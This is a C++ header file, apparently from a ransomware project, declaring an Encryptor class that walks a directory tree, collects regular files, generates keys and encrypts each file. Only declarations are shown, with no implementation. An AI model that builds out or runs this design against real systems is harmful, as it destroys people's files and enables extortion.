#ifndef RANSOMWARE_H
#define RANSOMWARE_H

#include <string>
#include <filesystem>
#include <vector>
#include <memory>
#include <cstdint>

class Encryptor final {
public:
    Encryptor() = delete;
    Encryptor(std::filesystem::path const &rootPath);

    ~Encryptor() = default;

    void Encrypt();

private:
    constexpr static auto CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789,.-#@$%&(){};'?!";

    using Key = std::unique_ptr<std::uint8_t[]>;

    Key GenerateKey(int length);
    void ProcessDirectory(std::filesystem::directory_entry const &rootEntry);
    void EncryptRegularFile(std::filesystem::path const &filePath);

    std::filesystem::path rootPath_{};
    std::vector<std::filesystem::path> regularFiles_{};
};

#endif // RANSOMWARE_H
